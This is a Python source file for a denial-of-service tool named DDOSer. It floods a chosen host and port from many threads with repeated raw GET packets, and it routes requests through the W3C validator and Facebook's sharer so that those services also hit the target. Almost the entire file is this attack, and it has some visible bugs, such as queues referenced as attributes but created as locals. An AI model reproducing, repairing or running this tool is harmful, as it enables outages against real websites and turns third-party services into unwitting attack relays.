from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

class DDOSer:
	def __init__(self) -> None:
		headers = open("main.txt", "r")
		self.data = headers.read()
		headers.close()
		#task queue are q,w
		q = Queue()
		w = Queue()

		print("\033[1;36m######  ######  #######  #####  ####### ######\033[0m")
		print("\033[1;36m#     # #     # #     # #     # #       #     #\033[0m")
		print("\033[1;36m#     # #     # #     # #       #       #     #\033[0m")
		print("\033[1;36m#     # #     # #     #  #####  #####   ######\033[0m")  
		print("\033[1;36m#     # #     # #     #       # #       #   #\033[0m")
		print("\033[1;36m#     # #     # #     # #     # #       #    #\033[0m") 
		print("\033[1;36m######  ######  #######  #####  ####### #     #\033[0m")
	
		if len(sys.argv) < 2:
			self.usage()
		self.get_parameters()
			
		print("\033[1;32;40mKeep Calm......\033[0m")
		self.user_agent()
		self.my_bots()
		time.sleep(5)
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((self.host,int(self.port)))
			s.settimeout(1)
		except socket.error as e:
			print("\033[91mCHECKING NOW.....\033[0m")
			self.usage()
		while True:
			for i in range(int(self.thr)):
				t = threading.Thread(target=self.dos)
				t.daemon = True  # if thread is exist, it dies
				t.start()
				t2 = threading.Thread(target=self.dos2)
				t2.daemon = True  # if thread is exist, it dies
				t2.start()
			start, item = time.time(), 0
			while True:
				if (item>1800):
					item=0
					time.sleep(.1)
				item += 1
				q.put(item)
				w.put(item)

	def user_agent(self):
		self.uagent = []
		self.uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
		self.uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
		self.uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
		self.uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
		self.uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
		self.uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
		self.uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
		return(self.uagent)


	def my_bots(self):
		self.bots=[]
		self.bots.append("http://validator.w3.org/check?uri=")
		self.bots.append("http://www.facebook.com/sharer/sharer.php?u=")
		return(self.bots)

	def bot_webattacking(self, url):
		try:
			while True:
				req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(self.uagent)}))
				print("\033[1;33;40mSERVER MAY BE DOWN.....\033[0m")
				time.sleep(.1)
		except:
			time.sleep(.1)

	def down_it(self, item):
		try:
			while True:
				packet = str("GET / HTTPS/1.1\nHost: "+self.host+"\n\n User-Agent: "+random.choice(self.uagent)+"\n"+self.data).encode('utf-8')
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((self.host,int(self.port)))
				if s.sendto( packet, (self.host, int(self.port)) ):
					s.shutdown(1)
					print ("\033[0m \033[94m DDOSING........... \033[0m")
				else:
					s.shutdown(1)
					print("\033[91mshut<->down\033[0m")
				time.sleep(.1)
		except socket.error as e:
			print("\033[91m!!!!!server down\033[0m")
			time.sleep(.1)


	def dos(self):
		while True:
			item = self.q.get()
			self.down_it(item)
			self.q.task_done()

	def dos2(self):
		while True:
			item = self.w.get()
			self.bot_webattacking(random.choice(self.bots)+"https://"+self.host)
				
			self.w.task_done()

	def get_parameters(self):
		optp = OptionParser(add_help_option=False,epilog="webattacks")
		optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
		optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
		optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
		optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 140 -t 140")
		optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
		opts, args = optp.parse_args()
		logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
		if opts.help:
			self.usage()
		if opts.host is not None:
			self.host = opts.host
		else:
			self.usage()
		if opts.port is None:
			self.port = 80
		else:
			self.port = opts.port
		if opts.turbo is None:
			self.thr = 135
		else:
			self.thr = opts.turbo
	
	def usage(self):
		pass # Skipping

if __name__ == '__main__':
	ddoser = DDOSer()